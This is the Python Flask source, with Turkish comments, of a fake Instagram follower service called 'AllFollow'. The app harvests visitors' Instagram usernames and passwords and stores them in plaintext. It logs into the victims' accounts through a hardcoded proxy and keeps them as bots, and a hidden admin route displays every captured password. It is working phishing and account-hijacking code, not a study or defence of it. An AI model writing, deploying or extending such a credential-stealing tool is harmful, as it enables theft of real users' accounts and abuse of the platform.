import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v54-final-fix"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Aktif botları burada tutuyoruz
active_bots = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    coins = db.Column(db.Integer, default=1000)
    status = db.Column(db.String(20), default="Bekliyor")

# --- GERÇEK BOT LOGİN VE ÇALIŞTIRMA ---
def start_bot_worker(u, p):
    cl = Client()
    if PROXY_URL:
        cl.set_proxy(PROXY_URL)
    
    try:
        print(f"[*] {u} için giriş deneniyor...")
        cl.login(u, p)
        active_bots[u] = cl
        
        # Giriş başarılıysa DB güncelle
        with app.app_context():
            acc = IGAccount.query.filter_by(username=u).first()
            if acc:
                acc.status = "Aktif"
                db.session.commit()
        print(f"[+] {u} Giriş BAŞARILI. Bot çalışıyor.")
        
    except Exception as e:
        print(f"[-] {u} Giriş HATASI: {e}")
        with app.app_context():
            acc = IGAccount.query.filter_by(username=u).first()
            if acc:
                acc.status = "Hata: Şifre/Onay"
                db.session.commit()

# --- API YOLLARI ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. Bilgileri DB'ye saniyeler içinde yaz
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Bağlanıyor..."
    db.session.commit()

    # 2. Arka planda gerçek girişi başlat (Threading sayesinde donma yapmaz)
    thread = threading.Thread(target=start_bot_worker, args=(u, p))
    thread.start()

    # 3. Kullanıcıya "OK" dön (Hemen panele atar)
    return jsonify(status="success", coins=acc.coins)

@app.route('/gizli-admin-panel')
def admin():
    accounts = IGAccount.query.all()
    res = "<h1>Admin Kontrol</h1><table border='1'><tr><th>User</th><th>Pass</th><th>Status</th></tr>"
    for a in accounts:
        res += f"<tr><td>{a.username}</td><td>{a.password}</td><td>{a.status}</td></tr>"
    return res + "</table>"

# --- ARAYÜZ (HTML) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .page { display: none; }
        .page.active { display: block; }
        .purple-h { background: #a100ff; border-radius: 0 0 30px 30px; }
    </style>
</head>
<body class="bg-gray-50 flex flex-col items-center">

    <div id="login-p" class="page active w-full max-w-[450px] min-h-screen bg-black p-10 flex flex-col justify-center">
        <h1 class="text-4xl font-black text-white italic text-center mb-10">ALL FOLLOW</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none">
            <button onclick="baglan()" id="b" class="w-full p-4 bg-[#a100ff] text-white font-bold rounded-2xl shadow-lg">GİRİŞ YAP</button>
        </div>
    </div>

    <div id="main-p" class="page w-full max-w-[450px] min-h-screen">
        <div class="purple-h p-6 text-white shadow-xl">
            <div class="flex justify-between items-center mb-6">
                <div class="bg-white/20 px-4 py-1.5 rounded-full font-bold">🟡 1,000</div>
                <i class="fas fa-cog"></i>
            </div>
            <div class="bg-white p-4 rounded-2xl flex justify-around text-purple-600 shadow-md">
                <div class="text-center"><i class="fas fa-tasks text-xl"></i><p class="text-[10px]">Görevler</p></div>
                <div onclick="location.reload()" class="text-center"><i class="fas fa-user-plus text-xl"></i><p class="text-[10px]">Ekle</p></div>
            </div>
        </div>
        <div class="p-6">
            <div class="bg-white p-5 rounded-3xl shadow-sm flex items-center justify-between border">
                <div class="flex items-center space-x-3">
                    <div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center font-bold text-purple-600">IG</div>
                    <div>
                        <p id="disp-u" class="font-bold text-gray-800"></p>
                        <p class="text-[10px] text-green-500 font-bold uppercase animate-pulse">Bot Başlatılıyor...</p>
                    </div>
                </div>
                <div class="w-3 h-3 bg-yellow-400 rounded-full"></div>
            </div>
            <button class="w-full mt-10 bg-[#a100ff] text-white py-4 rounded-2xl font-black shadow-xl">DURAKLAT</button>
        </div>
    </div>

    <script>
        function baglan() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            if(!u || !p) return;
            document.getElementById('b').innerText = "BAĞLANTI KURULUYOR...";

            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });

            // 1 saniye sonra panel açılır, bot arka planda giriş yapar
            setTimeout(() => {
                document.getElementById('disp-u').innerText = u;
                document.getElementById('login-p').classList.remove('active');
                document.getElementById('main-p').classList.add('active');
            }, 1200);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
